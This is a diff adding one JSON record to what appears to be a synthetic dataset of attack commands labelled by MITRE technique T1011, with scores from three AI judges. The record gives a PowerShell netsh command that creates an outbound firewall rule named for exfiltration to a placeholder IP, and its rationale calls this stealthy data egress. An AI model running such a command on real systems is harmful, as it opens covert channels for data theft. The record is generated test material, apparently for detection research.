@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "netsh advfirewall firewall add rule name=\"exfil_out_udp_60445\" dir=out action=allow enable=yes protocol=UDP remoteport=60445 remoteip=198.51.100.42 profile=any",
+  "explanation": "Creates a targeted outbound UDP allow rule for a high, uncommon port used by the configured tunnel/proxy, enabling alternate-medium exfiltration with minimal exposure (T1011).",
+  "rationale_steps": [
+    "Allow only the UDP port used by the tunnel (e.g., Teredo or custom proxy).",
+    "Restrict the rule to a single remote IP to avoid broad network impact.",
+    "Enable stealthy data egress over non-standard UDP channels."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-9788b456-046c34a1",
+  "source_prompt_hash": "9788b456",
+  "timestamp_utc": "2025-09-30T08:11:11.119466Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Command uses valid netsh advfirewall syntax with balanced quoting and appropriate parameters (dir, action, enable, protocol, remoteport, remoteip, profile).",
+        "semantic_score": 2,
+        "semantic_justification": "While it would create a targeted outbound UDP allow rule if run with admin rights, it contradicts the 'Privilege: None' claim and does not specifically enforce or leverage an alternate network medium as required by T1011.",
+        "combined_score": 3.5,
+        "confidence": 0.82,
+        "timestamp": "2025-09-30T23:46:50.094459Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper syntax for the netsh advfirewall firewall add rule command, including correctly formatted parameters, balanced quotes, and valid flag formats.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1011 by creating a specific outbound firewall rule that would allow data exfiltration over UDP to a specific IP and uncommon port (60445), which could facilitate exfiltration over an alternative network medium.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-09-30T23:46:53.920912Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct syntax, valid flags, and balanced quoting for the `netsh advfirewall` utility.",
+        "semantic_score": 2,
+        "semantic_justification": "While the command's arguments are semantically correct for creating a firewall rule, the stated 'Privilege: None' means it will fail to execute and achieve its claimed intent of 'Creates a targeted outbound UDP allow rule', thereby not enabling exfiltration.",
+        "combined_score": 3.5,
+        "confidence": 1,
+        "timestamp": "2025-09-30T23:47:13.411750Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 3.0,
+    "llm_average_score": 4.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
